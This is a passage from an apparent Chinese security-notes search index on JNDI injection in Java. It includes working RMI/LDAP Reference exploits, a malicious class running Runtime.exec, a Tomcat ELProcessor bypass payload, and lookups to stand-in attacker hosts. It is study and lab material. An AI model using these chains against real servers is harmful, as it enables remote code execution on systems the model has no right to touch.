\u6709\u76f4\u63a5\u6216\u95f4\u63a5\u6267\u884c\u4ee3\u7801\u7684\u65b9\u6cd5\uff0c\u5e76\u4e14\u65b9\u6cd5\u53ea\u80fd\u4f20\u5165\u4e00\u4e2a\u5b57\u7b26\u4e32\u53c2\u6570\u3002 \u901a\u8fc7\u4e0a\u8ff0\u7684\u63cf\u8ff0\uff0c\u5bfb\u627e\u5230\u7b26\u5408\u7684\u7c7b\u6709: 1. tomcat8\u91cc\u7684j avax.el.ELProcessor#eval(String) 2. springboot 1.2.x\u81ea\u5e26\u7684 groovy.lang.GroovyShell#evaluate(String) \u653b\u51fb\u6d41\u7a0b # Obj.decodeObject() \u8fd4\u56deReference\u5bf9\u8c61 \u63a5\u7740\u4f1a\u8fdb\u5165 NamingManager.getObjectFactoryFromReference() \uff0c\u5982\u679c\u662fReference\u5bf9\u8c61\uff0c\u5219\u4f1a\u8fd4\u56de\u4e00\u4e2aObjectFactory\u5bf9\u8c61\uff08\u8fd9\u91cc\u5b9e\u73b0\u7c7b\u662fBeanFactory\uff09 \u5b9e\u4f8b\u5316beanClass\u540e\uff0c\u4f1a\u83b7\u53d6Reference\u5bf9\u8c61\u91cc\u7684forceString\u5c5e\u6027\u503c \u5c06\u5c5e\u6027\u503c\u4f1a\u4ee5\u9017\u53f7\u548c\u7b49\u53f7\u5206\u5272\uff0c\u683c\u5f0f\u5982param1=methodName1,param2=methodName2 \u63a5\u7740\u4f1a\u53cd\u5c04\u8c03\u7528beanClass\u5bf9\u8c61\u91cc\u540d\u4e3amethodName1\u7684\u65b9\u6cd5\uff0c\u5e76\u4f20\u5165\u53c2\u6570\uff0c\u9650\u5b9a\u53c2\u6570\u7c7b\u578b\u4e3aString\uff0c\u53c2\u6570\u901a\u8fc7Reference\u5bf9\u8c61\u91ccparam1\u5c5e\u6027\u83b7\u53d6\u3002 \u6a21\u62df\u653b\u51fb\u6d41\u7a0b\u5982\u4e0b: 1. \u642d\u5efatomcat\u6e90\u7801\u7684\u6d4b\u8bd5\u73af\u5883(\u4e2d\u6587\u4e71\u7801\u95ee\u9898\u53c2\u8003 \u8fd9\u91cc )\uff0c\u8fd9\u91cc\u6ce8\u610f\u8981\u4fee\u6539\u4e0bpom.xml\u7684\u4f9d\u8d56(\u7f51\u4e0a\u641c\u7d22\u5230\u7684pom.xml\u4f1a\u7f3a\u4e4fLDAPServer\u7684\u4f9d\u8d56\u4e14easyMock\u7684\u7248\u672c\u8fc7\u4f4e)\uff0c\u8fd9\u662f\u6211\u4f7f\u7528\u7684\u4f9d\u8d56 <?xml version=\"1.0\" encoding=\"UTF-8\"?> <project xmlns= \"http://maven.apache.org/POM/4.0.0\" xmlns:xsi= \"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation= \"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\" > <modelVersion> 4.0.0 </modelVersion> <groupId> org.apache </groupId> <artifactId> tomcat </artifactId> <name> apache-tomcat-8.5.75 </name> <version> 8.5.75 </version> <build> <finalName> Tomcat-8.5.57 </finalName> <sourceDirectory> java </sourceDirectory> <testSourceDirectory> test </testSourceDirectory> <resources> <resource> <directory> java </directory> </resource> </resources> <testResources> <testResource> <directory> test </directory> </testResource> </testResources> <plugins> <plugin> <groupId> org.apache.maven.plugins </groupId> <artifactId> maven-compiler-plugin </artifactId> <version> 3.5.1 </version> <configuration> <encoding> UTF-8 </encoding> <source> 1.8 </source> <target> 1.8 </target> </configuration> </plugin> </plugins> </build> <dependencies> <dependency> <groupId> junit </groupId> <artifactId> junit </artifactId> <version> 4.12 </version> <scope> test </scope> </dependency> <dependency> <groupId> com.unboundid </groupId> <artifactId> unboundid-ldapsdk </artifactId> <version> 6.0.0 </version> </dependency> <dependency> <groupId> org.easymock </groupId> <artifactId> easymock </artifactId> <version> 4.3 </version> <scope> test </scope> </dependency> <dependency> <groupId> org.apache.ant </groupId> <artifactId> ant </artifactId> <version> 1.10.0 </version> </dependency> <dependency> <groupId> wsdl4j </groupId> <artifactId> wsdl4j </artifactId> <version> 1.6.2 </version> </dependency> <dependency> <groupId> javax.xml </groupId> <artifactId> jaxrpc </artifactId> <version> 1.1 </version> </dependency> <dependency> <groupId> org.eclipse.jdt.core.compiler </groupId> <artifactId> ecj </artifactId> <version> 4.6.1 </version> </dependency> <!-- https://mvnrepository.com/artifact/org.glassfish/javax.xml.rpc --> <dependency> <groupId> org.glassfish </groupId> <artifactId> javax.xml.rpc </artifactId> <version> 3.0.1-b03 </version> </dependency> </dependencies> </project> 2. \u5728\u521b\u5efajava/exp\u6587\u4ef6\u5939\u5e76\u5199\u5165RMILocalFactoryServer.java: package exp ; import com.sun.jndi.rmi.registry.ReferenceWrapper ; import org.apache.naming.ResourceRef ; import javax.naming.NamingException ; import javax.naming.Reference ; import javax.naming.StringRefAddr ; import java.rmi.AlreadyBoundException ; import java.rmi.RemoteException ; import java.rmi.registry.LocateRegistry ; import java.rmi.registry.Registry ; public class RMILocalFactoryServer { public static void main ( String [] args ) throws RemoteException , NamingException , AlreadyBoundException { // \u521b\u5efaRegistry Registry registry = LocateRegistry . createRegistry ( 9999 ); ResourceRef ref = new ResourceRef ( \"javax.el.ELProcessor\" , null , \"\" , \"\" , true , \"org.apache.naming.factory.BeanFactory\" , null ); ref . add ( new StringRefAddr ( \"forceString\" , \"KINGX=eval\" )); ref . add ( new StringRefAddr ( \"KINGX\" , \"''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(null).exec('calc.exe')\" )); ReferenceWrapper referenceWrapper = new ReferenceWrapper ( ref ); registry . bind ( \"Exploit\" , referenceWrapper ); System . out . println ( \"java LocalFactory RMI registry created. port on 9999...\" ); } } 3. \u5728web/ROOT\u4e2d\u5199\u5165client.jsp: <%@ page import=\"javax.naming.*\" %> <%@ page import=\"javax.el.ELProcessor\" %> <% try { Context ctx = new InitialContext(); ctx.lookup(\"rmi://127.0.0.1:9999/Exploit\"); } catch (NamingException e) { e.printStackTrace(); } %> 4. \u8fd0\u884cRMILocalFactoryServer 5. \u8fd0\u884ctomcat\u670d\u52a1\u5668\uff0c\u8bbf\u95eehttp://127.0.0.1:8080/client.jsp\uff0c\u89e6\u53d1\u4efb\u610fjava\u4ee3\u7801\u6267\u884c \u603b\u7ed3 # \u6839\u636e\u76ee\u6807\u4e0d\u540c\u7684jdk\u7248\u672c\u9009\u62e9\u4e0d\u540c\u7684\u653b\u51fb\u65b9\u5f0f\u3002","title":"JNDI"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/JNDI/#jndi","text":"","title":"JNDI"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/JNDI/#\u53c2\u8003\u6587\u7ae0","text":"https://paper.seebug.org/1091/ https://xz.aliyun.com/t/10674 https://www.cnblogs.com/wk-missQ1/p/13138720.html https://cloud.tencent.com/developer/article/1441354","title":"\u53c2\u8003\u6587\u7ae0"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/JNDI/#jndi_1","text":"JNDI (Java Naming and Directory Interface) \uff0c\u5305\u62ecNaming Service\u548cDirectory Service\u3002JNDI\u662fJava API\uff0c\u5141\u8bb8\u5ba2\u6237\u7aef\u901a\u8fc7\u540d\u79f0\u53d1\u73b0\u548c\u67e5\u627e\u6570\u636e\u3001\u5bf9\u8c61\u3002\u8fd9\u4e9b\u5bf9\u8c61\u53ef\u4ee5\u5b58\u50a8\u5728\u4e0d\u540c\u7684\u547d\u540d\u6216\u76ee\u5f55\u670d\u52a1\u4e2d\uff0c\u4f8b\u5982\u8fdc\u7a0b\u65b9\u6cd5\u8c03\u7528\uff08RMI\uff09\uff0c\u516c\u5171\u5bf9\u8c61\u8bf7\u6c42\u4ee3\u7406\u4f53\u7cfb\u7ed3\u6784\uff08CORBA\uff09\uff0c\u8f7b\u578b\u76ee\u5f55\u8bbf\u95ee\u534f\u8bae\uff08LDAP\uff09\u6216\u57df\u540d\u670d\u52a1\uff08DNS\uff09\u3002","title":"JNDI"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/JNDI/#naming-service","text":"\u547d\u540d\u670d\u52a1\u662f\u5c06\u540d\u79f0\u4e0e\u503c\u76f8\u5173\u8054\u7684\u5b9e\u4f53\uff0c\u79f0\u4e3a\"\u7ed1\u5b9a\"\u3002\u5b83\u63d0\u4f9b\u4e86\u4e00\u79cd\u4f7f\u7528\"find\"\u6216\"search\"\u64cd\u4f5c\u6765\u6839\u636e\u540d\u79f0\u67e5\u627e\u5bf9\u8c61\u7684\u4fbf\u6377\u65b9\u5f0f\u3002 \u5c31\u50cfDNS\u4e00\u6837\uff0c\u901a\u8fc7\u547d\u540d\u670d\u52a1\u5668\u63d0\u4f9b\u670d\u52a1\uff0c\u5927\u90e8\u5206\u7684J2EE\u670d\u52a1\u5668\u90fd\u542b\u6709\u547d\u540d\u670d\u52a1\u5668 \u3002\u4f8b\u5982RMI Registry\u5c31\u662f\u4f7f\u7528\u7684Naming Service\u3002","title":"Naming Service"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/JNDI/#directory-service","text":"\u662f\u4e00\u79cd\u7279\u6b8a\u7684Naming Service\uff0c\u5b83\u5141\u8bb8\u5b58\u50a8\u548c\u641c\u7d22\"\u76ee\u5f55\u5bf9\u8c61\"\uff0c\u4e00\u4e2a\u76ee\u5f55\u5bf9\u8c61\u4e0d\u540c\u4e8e\u4e00\u4e2a\u901a\u7528\u5bf9\u8c61\uff0c\u76ee\u5f55\u5bf9\u8c61\u53ef\u4ee5\u4e0e\u5c5e\u6027\u5173\u8054\uff0c\u56e0\u6b64\uff0c\u76ee\u5f55\u670d\u52a1\u63d0\u4f9b\u4e86\u5bf9\u8c61\u5c5e\u6027\u8fdb\u884c\u64cd\u4f5c\u529f\u80fd\u7684\u6269\u5c55\u3002\u4e00\u4e2a\u76ee\u5f55\u662f\u7531\u76f8\u5173\u8054\u7684\u76ee\u5f55\u5bf9\u8c61\u7ec4\u6210\u7684\u7cfb\u7edf\uff0c\u4e00\u4e2a\u76ee\u5f55\u7c7b\u4f3c\u4e8e\u6570\u636e\u5e93\uff0c\u4e0d\u8fc7\u5b83\u4eec\u901a\u5e38\u4ee5\u7c7b\u4f3c\u6811\u7684\u5206\u5c42\u7ed3\u6784\u8fdb\u884c\u7ec4\u7ec7\u3002\u53ef\u4ee5\u7b80\u5355\u7406\u89e3\u6210\u5b83\u662f\u4e00\u79cd\u7b80\u5316\u7684RDBMS\u7cfb\u7edf\uff0c\u901a\u8fc7\u76ee\u5f55\u5177\u6709\u7684\u5c5e\u6027\u4fdd\u5b58\u4e00\u4e9b\u7b80\u5355\u7684\u4fe1\u606f\u3002\u4e0b\u9762\u8bf4\u5230\u7684LDAP\u5c31\u662f\u76ee\u5f55\u670d\u52a1\u3002","title":"Directory Service"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/JNDI/#jndi\u6982\u5ff5","text":"\u539f\u5b50\u540d \u662f\u4e00\u4e2a\u7b80\u5355\u3001\u57fa\u672c\u3001\u4e0d\u53ef\u5206\u5272\u7684\u7ec4\u6210\u90e8\u5206 \u7ed1\u5b9a \u662f\u540d\u79f0\u4e0e\u5bf9\u8c61\u7684\u5173\u8054\uff0c\u6bcf\u4e2a\u7ed1\u5b9a\u90fd\u6709\u4e00\u4e2a\u4e0d\u540c\u7684\u539f\u5b50\u540d \u590d\u5408\u540d \u5305\u542b\u96f6\u4e2a\u6216\u591a\u4e2a\u539f\u5b50\u540d\uff0c\u5373\u7531\u591a\u4e2a\u7ed1\u5b9a\u7ec4\u6210 \u4e0a\u4e0b\u6587 \u662f\u5305\u542b\u96f6\u4e2a\u6216\u591a\u4e2a\u7ed1\u5b9a\u7684\u5bf9\u8c61\uff0c\u6bcf\u4e2a\u7ed1\u5b9a\u90fd\u6709\u4e00\u4e2a\u4e0d\u540c\u7684\u539f\u5b50\u540d \u547d\u540d\u7cfb\u7edf \u662f\u4e00\u7ec4\u5173\u8054\u7684\u4e0a\u4e0b\u6587 \u540d\u79f0\u7a7a\u95f4 \u662f\u547d\u540d\u7cfb\u7edf\u4e2d\u5305\u542b\u7684\u6240\u6709\u540d\u79f0 \u521d\u59cb\u4e0a\u4e0b\u6587 \u662f\u63a2\u7d22\u540d\u79f0\u7a7a\u95f4\u7684\u8d77\u70b9 \u8981\u83b7\u53d6\u521d\u59cb\u4e0a\u4e0b\u6587\uff0c\u9700\u8981\u4f7f\u7528\u521d\u59cb\u4e0a\u4e0b\u6587\u5de5\u5382","title":"JNDI\u6982\u5ff5"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/JNDI/#jndi\u7684\u597d\u5904","text":"JNDI\u81ea\u8eab\u5e76\u4e0d\u533a\u5206\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u5668\u7aef\uff0c\u4e5f\u4e0d\u5177\u5907\u8fdc\u7a0b\u80fd\u529b\uff0c\u4f46\u662f\u88ab\u5176\u534f\u540c\u7684\u4e00\u4e9b\u5176\u4ed6\u5e94\u7528\u4e00\u822c\u90fd\u5177\u5907\u8fdc\u7a0b\u80fd\u529b\uff0cJNDI\u5728\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u5668\u7aef\u90fd\u80fd\u591f\u8fdb\u884c\u4e00\u4e9b\u5de5\u4f5c\uff0c\u5ba2\u6237\u7aef\u4e0a\u4e3b\u8981\u662f\u8fdb\u884c\u5404\u79cd\u8bbf\u95ee\uff0c\u67e5\u8be2\uff0c\u641c\u7d22\uff0c\u800c\u670d\u52a1\u5668\u7aef\u4e3b\u8981\u8fdb\u884c\u7684\u662f\u5e2e\u52a9\u7ba1\u7406\u914d\u7f6e\uff0c\u4e5f\u5c31\u662f\u5404\u79cdbind\u3002\u6bd4\u5982\u5728RMI\u670d\u52a1\u5668\u7aef\u4e0a\u53ef\u4ee5\u4e0d\u76f4\u63a5\u4f7f\u7528Registry\u8fdb\u884cbind\uff0c\u800c\u4f7f\u7528JNDI\u7edf\u4e00\u7ba1\u7406\uff0c\u5f53\u7136JNDI\u5e95\u5c42\u5e94\u8be5\u8fd8\u662f\u8c03\u7528\u7684Registry\u7684bind\uff0c\u4f46\u597d\u5904JNDI\u63d0\u4f9b\u7684\u662f\u7edf\u4e00\u7684\u914d\u7f6e\u63a5\u53e3\uff1b\u5728\u5ba2\u6237\u7aef\u4e5f\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7\u7c7b\u4f3cURL\u7684\u5f62\u5f0f\u6765\u8bbf\u95ee\u76ee\u6807\u670d\u52a1\uff0c\u53ef\u4ee5\u770b\u540e\u9762\u63d0\u5230\u7684 JNDI\u52a8\u6001\u534f\u8bae\u8f6c\u6362 \u3002\u628aRMI\u6362\u6210\u5176\u4ed6\u7684\u4f8b\u5982LDAP\u3001CORBA\u7b49\u4e5f\u662f\u540c\u6837\u7684\u9053\u7406\u3002","title":"JNDI\u7684\u597d\u5904"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/JNDI/#jndi\u793a\u4f8b","text":"","title":"JNDI\u793a\u4f8b"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/JNDI/#rmi","text":"Hashtable env = new Hashtable (); env . put ( Context . INITIAL_CONTEXT_FACTORY , \"com.sun.jndi.rmi.registry.RegistryContextFactory\" ); env . put ( Context . PROVIDER_URL , \"rmi://localhost:9999\" ); Context ctx = new InitialContext ( env ); //\u5c06\u540d\u79f0refObj\u4e0e\u4e00\u4e2a\u5bf9\u8c61\u7ed1\u5b9a\uff0c\u8fd9\u91cc\u5e95\u5c42\u4e5f\u662f\u8c03\u7528\u7684rmi\u7684registry\u53bb\u7ed1\u5b9a ctx . bind ( \"refObj\" , new RefObject ()); //\u901a\u8fc7\u540d\u79f0\u67e5\u627e\u5bf9\u8c61 ctx . lookup ( \"refObj\" );","title":"RMI"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/JNDI/#ldap","text":"Hashtable env = new Hashtable (); env . put ( Context . INITIAL_CONTEXT_FACTORY , \"com.sun.jndi.ldap.LdapCtxFactory\" ); env . put ( Context . PROVIDER_URL , \"ldap://localhost:1389\" ); DirContext ctx = new InitialDirContext ( env ); //\u901a\u8fc7\u540d\u79f0\u67e5\u627e\u8fdc\u7a0b\u5bf9\u8c61\uff0c\u5047\u8bbe\u8fdc\u7a0b\u670d\u52a1\u5668\u5df2\u7ecf\u5c06\u4e00\u4e2a\u8fdc\u7a0b\u5bf9\u8c61\u4e0e\u540d\u79f0cn=foo,dc=test,dc=org\u7ed1\u5b9a\u4e86 Object local_obj = ctx . lookup ( \"cn=foo,dc=test,dc=org\" );","title":"LDAP"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/JNDI/#jndi\u52a8\u6001\u534f\u8bae\u8f6c\u6362","text":"\u4e0a\u9762\u7684\u4e24\u4e2a\u4f8b\u5b50\u90fd\u624b\u52a8\u8bbe\u7f6e\u4e86\u5bf9\u5e94\u670d\u52a1\u7684\u5de5\u5382\u4ee5\u53ca\u5bf9\u5e94\u670d\u52a1\u7684PROVIDER_URL\uff0c\u4f46\u662fJNDI\u662f\u80fd\u591f\u8fdb\u884c\u52a8\u6001\u534f\u8bae\u8f6c\u6362\u7684\u3002 \u4f8b\u5982\uff1a Context ctx = new InitialContext (); ctx . lookup ( \"rmi://attacker-server/refObj\" ); //ctx.lookup(\"ldap://attacker-server/cn=bar,dc=test,dc=org\"); //ctx.lookup(\"iiop://attacker-server/bar\"); \u518d\u5982\u4e0b\u9762\u7684\uff1a Hashtable env = new Hashtable (); env . put ( Context . INITIAL_CONTEXT_FACTORY , \"com.sun.jndi.rmi.registry.RegistryContextFactory\" ); env . put ( Context . PROVIDER_URL , \"rmi://localhost:9999\" ); Context ctx = new InitialContext ( env ); String name = \"ldap://attacker-server/cn=bar,dc=test,dc=org\" ; //\u901a\u8fc7\u540d\u79f0\u67e5\u627e\u5bf9\u8c61 ctx . lookup ( name ); \u5373\u4f7f\u670d\u52a1\u7aef\u63d0\u524d\u8bbe\u7f6e\u4e86\u5de5\u5382\u4e0ePROVIDER_URL\u4e5f\u4e0d\u8981\u7d27\uff0c\u5982\u679c\u5728lookup\u65f6\u53c2\u6570\u80fd\u591f\u88ab\u653b\u51fb\u8005\u63a7\u5236\uff0c\u540c\u6837\u4f1a\u6839\u636e\u653b\u51fb\u8005\u63d0\u4f9b\u7684URL\u8fdb\u884c\u52a8\u6001\u8f6c\u6362\u3002","title":"JNDI\u52a8\u6001\u534f\u8bae\u8f6c\u6362"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/JNDI/#jndi\u6ce8\u5165\u8d77\u6e90","text":"JNDI\u6ce8\u5165 \u662fBlackHat 2016\uff08USA\uff09 @pentester \u7684\u4e00\u4e2a\u8bae\u9898\" A Journey From JNDI LDAP Manipulation To RCE \"[9]\u63d0\u51fa\u7684\u3002 \u4e0a\u9762\u63d0\u5230\u4e86 lookup() \u65b9\u6cd5\u5982\u679c\u53c2\u6570\u88ab\u63a7\u5236\u53ef\u80fd\u5b58\u5728jndi\u6ce8\u5165\u7684\u95ee\u9898\uff0c\u5b9e\u9645\u4e0a\u5176\u4ed6\u65b9\u6cd5\u6bd4\u5982 InitialContext.rename() \u3001 InitialContext.lookupLink() \u6700\u540e\u4e5f\u8c03\u7528\u4e86 InitialContext.lookup() \u3002\u8fd8\u6709\u5176\u4ed6\u5305\u88c5\u4e86JNDI\u7684\u5e94\u7528\uff0c\u4f8b\u5982 Apache's Shiro JndiTemplate \u3001 Spring's JndiTemplate \u4e5f\u4f1a\u8c03\u7528 InitialContext.lookup() \u3002","title":"JNDI\u6ce8\u5165\u8d77\u6e90"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/JNDI/#jndi\u653b\u51fb\u5411\u91cf","text":"RMI LDAP Serialized Object JNDI Reference Remote Object\uff08\u6709\u5b89\u5168\u7ba1\u7406\u5668\u7684\u9650\u5236\uff0c\u5728\u4e0a\u9762RMI\u5229\u7528\u90e8\u5206\u4e5f\u80fd\u770b\u5230\uff09 Remote Location CORBA IOR \u8fd9\u91cc\u5f15\u7528\u4e00\u5f20\u7ecf\u5178\u56fe\u7247\uff0c\u4ee5\u66f4\u597d\u5730\u8bf4\u660ejdk\u7248\u672c\u4e0e\u653b\u51fb\u5411\u91cf\u7684\u9009\u62e9:","title":"JNDI\u653b\u51fb\u5411\u91cf"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/JNDI/#jndi-referencermi\u653b\u51fb","text":"","title":"JNDI Reference+RMI\u653b\u51fb"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/JNDI/#\u9650\u5236\u6761\u4ef6","text":"JDK 6 <6u132 JDK 7 < 7u122 JDK 8 < 8u113 \u5728\u8fd9\u4e9b\u7248\u672c\u4e4b\u540e\uff0c\u7cfb\u7edf\u5c5e\u6027 com.sun.jndi.rmi.object.trustURLCodebase \u3001 com.sun.jndi.cosnaming.object.trustURLCodebase \u7684\u9ed8\u8ba4\u503c\u53d8\u4e3afalse\uff0c\u5373\u9ed8\u8ba4\u4e0d\u5141\u8bb8RMI\u3001cosnaming\u4ece\u8fdc\u7a0b\u7684Codebase\u52a0\u8f7dReference\u5de5\u5382\u7c7b\u3002","title":"\u9650\u5236\u6761\u4ef6"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/JNDI/#\u524d\u7f6e\u4ecb\u7ecd","text":"","title":"\u524d\u7f6e\u4ecb\u7ecd"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/JNDI/#\u653b\u51fb\u6d41\u7a0b","text":"\u5728\u6211\u4eec\u653b\u51fb\u6d41\u7a0b\u4e2d\uff0c\u6211\u4eec\u9700\u8981\u4f7f\u7528\u5230Reference\u7c7b\uff0c\u5176\u6709\u51e0\u4e2a\u6bd4\u8f83\u5173\u952e\u7684\u5c5e\u6027\uff1a 1. className - \u8fdc\u7a0b\u52a0\u8f7d\u65f6\u6240\u4f7f\u7528\u7684\u7c7b\u540d\uff0c\u5982\u679c\u672c\u5730\u627e\u4e0d\u5230\u8fd9\u4e2a\u7c7b\u540d\uff0c\u5c31\u53bb\u8fdc\u7a0b\u52a0\u8f7d 2. classFactory - \u8fdc\u7a0b\u7684\u5de5\u5382\u7c7b 3. classFactoryLocation - \u5de5\u5382\u7c7b\u52a0\u8f7d\u7684\u5730\u5740\uff0c\u53ef\u4ee5\u662f\u5404\u79cd\u534f\u8bae\uff0c\u5982http:// \u53c2\u8003\u4ee3\u7801\u5982\u4e0b: Reference refObj = new Reference ( \"refClassName\" , \"FactoryClassName\" , \"http://evil.com:8000/\" ); //refClassName\u4e3a\u7c7b\u540d\u52a0\u4e0a\u5305\u540d\uff0cFactoryClassName\u4e3a\u5de5\u5382\u7c7b\u540d\u5e76\u4e14\u5305\u542b\u5de5\u5382\u7c7b\u7684\u5305\u540d\uff0chttp://evil.com:9999/\u662fclassFactoryLocation ReferenceWrapper refObjWrapper = new ReferenceWrapper ( refObj ); registry . bind ( \"refObj\" , refObjWrapper ); \u5b8c\u6574\u4ee3\u7801\u5982\u4e0b : \u5ba2\u6237\u7aef: import javax.naming.Context ; import javax.naming.InitialContext ; public class RMIClient { public static void main ( String [] args ) throws Exception { Context ctx = new InitialContext (); ctx . lookup ( \"rmi://127.0.0.1:9999/refObj\" ); } } \u670d\u52a1\u7aef: import com.sun.jndi.rmi.registry.ReferenceWrapper ; import javax.naming.NamingException ; import javax.naming.Reference ; import java.rmi.AlreadyBoundException ; import java.rmi.RemoteException ; import java.rmi.registry.LocateRegistry ; import java.rmi.registry.Registry ; public class RMIServer { public static void main ( String [] args ) throws RemoteException , NamingException , AlreadyBoundException { Registry registry = LocateRegistry . createRegistry ( 9999 ); System . out . println ( \"java RMI registry created. port on 9999...\" ); Reference refObj = new Reference ( \"ExportObject\" , \"EvilClass\" , \"http://127.0.0.1:8000/\" ); ReferenceWrapper refObjWrapper = new ReferenceWrapper ( refObj ); registry . bind ( \"refObj\" , refObjWrapper ); } } \u6076\u610f\u7c7b: import java.io.IOException; public class EvilClass { public EvilClass() { } static { try { Runtime.getRuntime().exec(\"calc.exe\"); } catch (IOException var1) { var1.printStackTrace(); } } } \u5b8c\u6574\u653b\u51fb\u6d41\u7a0b : 1. \u7f16\u8bd1EvilClass.java\u4e3aEvilClass.class ( javac EvilClass.java ) 2. \u8fd0\u884c\u6076\u610fhttp server\uff0c\u6302\u8f7d\u4e0a\u8ff0class( python3 -m http.server 8000 ) 3. \u8fd0\u884c\u6076\u610frmi server(\u4e0a\u9762\u7684RMIServer\u7c7b) 4. \u8fd0\u884c\u5ba2\u6237\u7aef\u53d1\u8d77\u8bf7\u6c42(\u4e0a\u9762\u7684RMIClient\u7c7b) 5. \u5ba2\u6237\u7aef\u5bf9\u6076\u610fRMI server\u53d1\u9001\u8bf7\u6c42\uff0c\u83b7\u53d6\u8fdc\u7a0b\u5bf9\u8c61\u5b58\u6839\u5b9e\u4f8b 6. \u5ba2\u6237\u7aef\u4f1a\u5148\u4ece\u672c\u5730\u7684 CLASSPATH \u4e2d\u5bfb\u627e ExportObject \uff0c\u5982\u679c\u627e\u4e0d\u5230\uff0c\u5219\u4ececlassFactoryLocation\u5373 http://127.0.0.1:8000/EvilClass.class \u4e2d\u5bfb\u627e\u5de5\u5382\u7c7b 7. \u5ba2\u6237\u7aef\u901a\u8fc7\u5b9e\u4f8b\u5316\u5de5\u5382\u7c7b\u83b7\u53d6\u771f\u6b63\u7684\u5bf9\u8c61\uff0c\u5de5\u5382\u7c7b\u4e2d\u5305\u542b\u7684\u6076\u610f\u4ee3\u7801\u88ab\u6267\u884c","title":"\u653b\u51fb\u6d41\u7a0b"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/JNDI/#jndi-referenceldap\u653b\u51fb","text":"\u8fd9\u91cc\u5c31\u4e0d\u4ecb\u7ecdldap\u534f\u8bae\u4e86\uff0c\u76f4\u63a5\u770b\u5982\u4f55\u653b\u51fb\u3002","title":"JNDI Reference+LDAP\u653b\u51fb"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/JNDI/#\u9650\u5236\u6761\u4ef6_1","text":"JDK 6 < 6u211 JDK 7 < 7u201 JDK 8 < 8u191 JDK 11 < 11.0.1 \u5728\u8fd9\u4e9b\u7248\u672c\u4e4b\u540e\uff0c com.sun.jndi.ldap.object.trustURLCodebase \u5c5e\u6027\u7684\u9ed8\u8ba4\u503c\u88ab\u8c03\u6574\u4e3afalse\uff0c\u5bf9LDAP Reference\u8fdc\u7a0b\u5de5\u5382\u7c7b\u7684\u52a0\u8f7d\u589e\u52a0\u4e86\u9650\u5236\u3002","title":"\u9650\u5236\u6761\u4ef6"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/JNDI/#\u653b\u51fb\u6d41\u7a0b_1","text":"\u653b\u51fb\u6d41\u7a0b\u4e0e\u4e0a\u9762\u7684JNDI Reference+RMI\u653b\u51fb\u7c7b\u4f3c\u3002 \u5b8c\u6574\u4ee3\u7801\u5982\u4e0b (\u53c2\u8003marshalsec\u9879\u76ee): \u5ba2\u6237\u7aef: import javax.naming.Context ; import javax.naming.InitialContext ; public class LDAPClient { public static void main ( String [] args ) throws Exception { Context ctx = new InitialContext (); ctx . lookup ( \"ldap://127.0.0.1:7777/anything\" ); } } \u670d\u52a1\u7aefmaven\u4f9d\u8d56: <dependency> <groupId> com.unboundid </groupId> <artifactId> unboundid-ldapsdk </artifactId> <version> 6.0.0 </version> </dependency> \u670d\u52a1\u7aef: import com.unboundid.ldap.listener.InMemoryDirectoryServer ; import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig ; import com.unboundid.ldap.listener.InMemoryListenerConfig ; import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult ; import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor ; import com.unboundid.ldap.sdk.Entry ; import com.unboundid.ldap.sdk.LDAPException ; import com.unboundid.ldap.sdk.LDAPResult ; import com.unboundid.ldap.sdk.ResultCode ; import javax.net.ServerSocketFactory ; import javax.net.SocketFactory ; import javax.net.ssl.SSLSocketFactory ; import java.net.InetAddress ; import java.net.MalformedURLException ; import java.net.URL ; public class LDAPServer { private static final String LDAP_BASE = \"dc=example,dc=com\" ; public static void main ( String [] tmp_args ) { String [] args = new String [] { \"http://127.0.0.1:8000/#EvilClass\" }; int port = 7777 ; try { InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig ( LDAP_BASE ); config . setListenerConfigs ( new InMemoryListenerConfig ( \"listen\" , //$NON-NLS-1$ InetAddress . getByName ( \"0.0.0.0\" ), //$NON-NLS-1$ port , ServerSocketFactory . getDefault (), SocketFactory . getDefault (), ( SSLSocketFactory ) SSLSocketFactory . getDefault ())); config . addInMemoryOperationInterceptor ( new OperationInterceptor ( new URL ( args [ 0 ] ))); InMemoryDirectoryServer ds = new InMemoryDirectoryServer ( config ); System . out . println ( \"Listening on 0.0.0.0:\" + port ); //$NON-NLS-1$ ds . startListening (); } catch ( Exception e ) { e . printStackTrace (); } } private static class OperationInterceptor extends InMemoryOperationInterceptor { private URL codebase ; public OperationInterceptor ( URL cb ) { this . codebase = cb ; } @Override public void processSearchResult ( InMemoryInterceptedSearchResult result ) { String base 